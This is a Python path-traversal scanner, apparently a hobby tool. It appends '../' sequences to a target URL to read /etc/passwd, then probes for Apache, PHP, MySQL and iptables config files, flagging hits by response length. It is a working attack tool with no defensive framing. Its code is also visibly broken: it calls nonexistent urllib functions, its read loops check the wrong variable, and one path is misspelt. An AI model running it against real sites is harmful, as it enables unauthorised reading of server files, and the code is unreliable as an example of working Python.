#--Created by WD
#python 3.6
#coding:utf-8


import requests
import urllib
import sys

var1 = 0
var2 = 0
print("-----------------------------------------------------")
print("|           usage:path.py site url                  |")
print("|this url like http://www.google.com/index.php?id=  |")
print("       writed by eip_0x[Freebuf],just 4 fun         |")
print("-----------------------------------------------------")

site0 = sys.argv[1] + '/kfdsjkf7675637d.txt'
req0 = urllib.Request(site0)
conn0 = urllib.urlopen(req0)

while 1:
    data0 = conn0.read(4072)
    if not len(data0):
        break

paths1 = ['/etc/passwd', '../etc/passwd', '../../etc/passwd', '../../../etc/passwd', '../../../../etc/passwd',
          '../../../../../etc/passwd', '../../../../../../etc/passwd', '../../../../../../../etc/passwd',
          '../../../../../../../etc/passwd', '../../../../../../../../etc/passwd',
          '../../../../../../../../../etc/passwd', '../../../../../../../../../../etc/passwd']
paths2 = ['/usr/local/app/apache2/conf/httpd.conf', '/usr/local/apache2/conf/httpd.conf',
          '/usr/local/app/apache2/conf/extra/httpd-vhosts.conf', '/usr/local/app/php5/lib/php.ini',
          '/etc/sysconfig/iptables', '/etc/httpd/conf/httpd.conf', '/etc/my.cnf', '/etc/issue', '/etc/redhat-release',
          '/usr/local/apche/conf/httpd.conf', '/etc/httpd/conf/httpd.conf']

for path in paths1:
    site = sys.argv[1] + path
    req = urllib.Request(site)
    conn = urllib.urlopen(req)
    while 1:
        data = conn.read(4072)
        if not len(data0):
            break

        if len(data) != len(data0):
            print(path, " this file has been found!!!!u r lucky and have fun!!!!")

        for path2 in paths2:
            path2ok = path.replace("/etc/passwd", path2)
            site2 = sys.argv[1] + path2ok
            req2 = urllib.Request(site2)
            conn2 = urllib.urlopen(req2)
            while 1:
                data2 = conn2.read(4072)
                if not len(data2):
                    break
                if len(data2) != len(data0):
                    print(path2, "this file has been found!!")